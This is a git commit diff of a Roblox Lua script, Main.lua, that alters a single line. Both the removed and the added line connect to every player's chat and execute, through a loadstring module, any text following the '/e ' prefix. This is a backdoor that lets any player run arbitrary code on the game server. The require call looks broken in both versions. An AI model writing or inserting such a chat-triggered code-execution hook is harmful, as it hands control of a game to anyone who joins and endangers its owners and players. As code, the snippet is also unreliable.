195320a65697f6d8e7a7e250850c3c53539e49d5
GalaxyBlueReal <40841775+GalaxyBlueReal@users.noreply.github.com>
2020-03-12 01:35:59 -0400

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,1 +1,1 @@
-ee=require(Loadstring) for i, v in pairs(game.Players:GetChildren()) do v.Chatted:Connect(function(msg)if msg:sub(1,3) == "/e " then local args = msg:sub(4) ee(args)() end end)end
+ee=require(Loadstring.lua) for i, v in pairs(game.Players:GetChildren()) do v.Chatted:Connect(function(msg)if msg:sub(1,3) == "/e " then local args = msg:sub(4) ee(args)() end end)end
